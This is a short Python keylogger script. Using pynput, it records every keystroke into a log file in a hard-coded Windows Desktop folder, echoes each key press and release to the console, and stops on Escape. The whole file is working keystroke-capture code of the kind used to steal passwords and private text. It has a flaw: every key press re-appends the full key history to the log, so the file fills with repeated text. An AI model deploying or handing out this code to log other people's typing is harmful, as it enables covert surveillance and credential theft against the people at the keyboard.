import os
import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    keys.append(key)
    write_file(keys)

    try:
        print('Alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('Special key {0} pressed'.format(key))

def write_file(keys, folder_path=r"C:\Users\Dell\Desktop\keylogger\logsfolder"):
    # Create the folder if it doesn't exist
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
    
    # Define the full path for the file
    file_path = os.path.join(folder_path, "log.txt")
    
    with open(file_path, 'a') as f:  # Open in append mode to add to the file
        for key in keys:
            # Remove the quotes around the key
            k = str(key).replace("'", "")
            f.write(k)
            f.write(' ')  # Adding a space after each key for readability

    print(f"Log saved in {file_path}")

def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        # Stop listener when the Escape key is pressed
        return False

# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
